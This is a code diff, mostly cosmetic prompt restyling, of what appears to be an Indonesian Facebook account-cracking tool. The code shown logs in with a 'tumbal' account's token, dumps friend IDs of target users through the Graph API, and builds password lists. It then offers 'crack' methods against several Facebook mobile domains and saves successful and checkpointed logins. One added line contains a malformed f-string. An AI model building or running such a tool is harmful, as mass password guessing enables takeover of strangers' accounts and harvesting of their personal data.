@@ -137,7 +137,7 @@ class REQ:
                                  `` ``''')
    def Pepek(self):
        self.Logooo()
-       print(f'\t\t           [bold blue]Login Licensi', style=f"bold purple")
+       print(f'\t\t           [bold blue]Login Licensi')
        print(' [bold green]╰─▶[bold blue] 1[bold yellow] Login Ke Tools')
        print(' [bold green]╰─▶[bold blue] 2[bold yellow] Hubungi Admin')
        pil = input(f'✶ ━━⫸ {H} Choice{N} : ')
@@ -211,12 +211,12 @@ class REQ:
            Console().print(f"[•]{U2} {str(e).title()}") ; sleep(3.1) ; self.DEL_Cok() ; self.REQ_Cookie()
        except requests.exceptions.ConnectionError as e:
            Console().print(f"[•]{U2} {str(e).title()}") ; sleep(3.1) ; sys.exit()
-       Console().print(f"[•]{U}Your Tumbal Name {M}{nama} {U2}And Uid {B}{id}")
-       Console().print(f'\n{H2}01{P2}. {U2}Crack publik\n{H2}02{P2}. {U2}Crack massal\n{H2}03{P2}. {U2}Crack email\n{H2}04{P2}. {U2}Crack file\n{H2}05{P2}. {U2}Result OK/CP\n{M2}00{P2}. {U2}Log-out ( {M2}Cookie{x} )')
+       Console().print(f"✶ ━━⫸[•]{U}Your Tumbal Name {M}{nama} {U2}And Uid {B}{id}")
+       Console().print(f'\n{H2}╰─▶ {H2}01{P2}. {U2}Crack publik\n{H2}╰─▶ {H2}02{P2}. {U2}Crack massal\n{H2}╰─▶ {H2}03{P2}. {U2}Crack email\n{H2}╰─▶ {H2}04{P2}. {U2}Crack file\n{H2}╰─▶ {H2}05{P2}. {U2}Result OK/CP\n{H2}╰─▶ {M2}00{P2}. {U2}Log-out ( {M2}Cookie{x} )')
        ykhh = Console().input(f'\n{M2}Input{N} : ')
        
        if ykhh =='1' or ykhh =='01':
-         uid = Console().input(f'\n{M2}Masukan Id{N} : ')
+         uid = Console().input(f'\n✶ ━━⫸{M2}Masukan Id{N} : ')
          data = {'access_token':toks, 'after':None}
          url = 'https://graph.facebook.com/v18.0/%s/friends'
          Console().print(f"[•]{U2} Sedang dump id {uid}") ; print('\r') ; sleep(3.3)
@@ -227,7 +227,7 @@ class REQ:
        
        elif ykhh =='2' or ykhh =='02':
            Console().print(f"[•]{U2} Masukan id target, banyaknya id pisahkan dengan "," ( koma )")
-           uid = Console().input(f'\n{M2}Masukan Id{N} : ')
+           uid = Console().input(f'\n✶ ━━⫸{M2}Masukan Id{N} : ')
            for uuid in uid:
                 try:
                     with requests.Session() as r:
@@ -239,8 +239,8 @@ class REQ:
        
        elif ykhh =='3' or ykhh =='03':
            try:
-                 nama = Console().input(f'\n{M2}Masukan Nama Target{N} : ')
-                 total = Console().input(f'\n{M2}Masukan Jumlah Dump{N} : ')
+                 nama = Console().input(f'\n✶ ━━⫸{M2}Masukan Nama Target{N} : ')
+                 total = Console().input(f'\n✶ ━━⫸{M2}Masukan Jumlah Dump{N} : ')
                  print('')
                  Dump().Dump_Email(nama, total)
            except Exception as e:
@@ -250,7 +250,7 @@ class REQ:
        
        elif ykhh =='4' or ykhh =='04':
            try:
-                Files = Console().input(f'\n{M2}Masukan tempat file anda (ex: /sdcard/dump.txt) : ')
+                Files = Console().input(f'\n✶ ━━⫸{M2}Masukan tempat file anda (ex: /sdcard/dump.txt) : ')
                 print('')    
                 Dump().Dump_File(Files)   
            except Exception as e:
@@ -259,8 +259,8 @@ class REQ:
            Furthermore().Methodee()
        
        elif ykhh =='5' or ykhh =='05':
-           Console().print(f'\n{H2}01{P2}. Check hasil OK\n{H2}02{P2}. Check hasil CP\n{H2}03{P2}. Kembali ke menu')
-           aa = Console().input(f'\n{M2}Input{N} : ')
+           Console().print(f'\n{H2}╰─▶ {H2}01{P2}. Check hasil OK\n{H2}╰─▶ {H2}02{P2}. Check hasil CP\n{H2}03{P2}. Kembali ke menu')
+           aa = Console().input(f'\n✶ ━━⫸{M2}Input{N} : ')
            
            if aa =='1' or aa =='01':
              try:
@@ -305,7 +305,7 @@ class Dump:
            for xyz in req['data']:
                uid = '%s|%s'%(xyz['id'],xyz['name'])
                if uid not in array:array.append(uid)
-               Console().print(f'{M2}Total Dump{N} -: {B2}{len(array)}{P2}',end='\r')
+               Console().print(f'[•]{M2}Total Dump{N} -: {B2}{len(array)}{P2}',end='\r')
            if 'paging' in str(req):
               after = req['paging']['cursors']['after']
               params.update({'after': after})
@@ -337,7 +337,7 @@ class Dump:
                             continue
                         else:
                             dump.append(f'{self.id_friends}|{self.name}')
-                            Console().print(f'{M2}Total Dump{N} -: {K2}{len(dump)}{P2}',end='\r')
+                            Console().print(f'[•]{M2}Total Dump{N} -: {K2}{len(dump)}{P2}',end='\r')
                 if 'Sorry, something went wrong.' in str(response):
                     return False
                 elif 'unit_cursor=' in str(response):
@@ -378,7 +378,7 @@ class Dump:
                     self.id = nama
                     self.nama = data 
                     dump.append(data+'|'+nama)
-                    Console().print(f'{M2}Total Dump{N} -: {H2}{len(dump)}.{len(data)}{P2}',end='\r')
+                    Console().print(f'[•]{M2}Total Dump{N} -: {H2}{len(dump)}.{len(data)}{P2}',end='\r')
         except (KeyboardInterrupt, Exception) as e:
             Console().print(f"[•]{U2} {str(e).title()}") ; sleep(3.1) ; sys.exit()
    
@@ -391,7 +391,7 @@ class Dump:
                     dump.append(data)
                 except Exception as e:
                     Console().print(f"[•]{U2} {str(e).title()}") ; sleep(3.1) ; sys.exit() 
-                Console().print(f'{M2}Total Dum{N} -: {H2}{len(dump)}{P2}',end='\r')
+                Console().print(f'[•{{M2}Total Dum{N} -: {H2}{len(dump)}{P2}',end='\r')
         except FileNotFoundError as e:
             Console().print(f"[•]{U2} {str(e).title()}") ; sleep(3.1) ; sys.exit()
 
@@ -407,8 +407,8 @@ class Furthermore:
    
    def Methodee(self):
        Console().print(Markdown(f"## Total {len(dump)} id terkumpul"),style='blue')
-       Console().print(f'\n{B2}01{P2}. Methode async ( {H2}m.facebook.com {P2})\n{B2}02{P2}. Methode validate ( {H2}mbasic.facebook.com {P2})\n{B2}03{P2}. Methode Reguler ( {H2}free.facebook.com {P2})\n{B2}04{P2}. Methode asyncAPP ( {H2}m.facebook.com{P2} )\n{B2}05{P2}. Methode validateAPP ( {H2}mbasic.facebook.com{P2} )')
-       Asw = Console().input(f'\n{M2}Input{N} : ')
+       Console().print(f'\n{H2}╰─▶ {B2}01{P2}. Methode async ( {H2}m.facebook.com {P2})\n{H2}╰─▶ {B2}02{P2}. Methode validate ( {H2}mbasic.facebook.com {P2})\n{H2}╰─▶ {B2}03{P2}. Methode Reguler ( {H2}free.facebook.com {P2})\n{H2}╰─▶ {B2}04{P2}. Methode asyncAPP ( {H2}m.facebook.com{P2} )\n{H2}╰─▶ {B2}05{P2}. Methode validateAPP ( {H2}mbasic.facebook.com{P2} )')
+       Asw = Console().input(f'\n✶ ━━⫸{M2}Input{N} : ')
        if Asw =='1' or Asw =='01':
          self.Method.append('async')
        elif Asw =='2' or Asw =='02':
@@ -424,10 +424,10 @@ class Furthermore:
        self.Wordlist()
    
    def Wordlist(self):
-        ask = Console().input(f'\n{M2}Ingin menambahkan sandi manual? (Y/t) ')
+        ask = Console().input(f'\n{H2}╰─▶ {M2}Ingin menambahkan sandi manual? (Y/t) ')
         if ask =='y' or ask =='Y' or ask =='Ya' or ask =='ya' or ask =='YA':
           self.Paslist.append('ya')
-          pwdia = Console().input(f'\n{M2}Buat Kata Sandi{N} : ')
+          pwdia = Console().input(f'\n✶ ━━⫸{M2}Buat Kata Sandi{N} : ')
           asky = pwdia.split(',')
           for x in asky:
               self.Passku.append(x)
@@ -437,7 +437,7 @@ class Furthermore:
    def Generate_id(self):
        Console().print(Markdown(f"[•]{U2} Setting userId anda"),style='yellow')
        Console().print(f'\n{K2}01{P2}. Facebook Id old\n{K2}02{P2}. Facebook id new\n{K2}03{P2}. Facebook id random')
-       ykh = Console().input(f'\n{M2}Input{N} : ')
+       ykh = Console().input(f'\n✶ ━━⫸{M2}Input{N} : ')
        
        if ykh =='1' or ykh =='01':
          for old in sorted(dump):
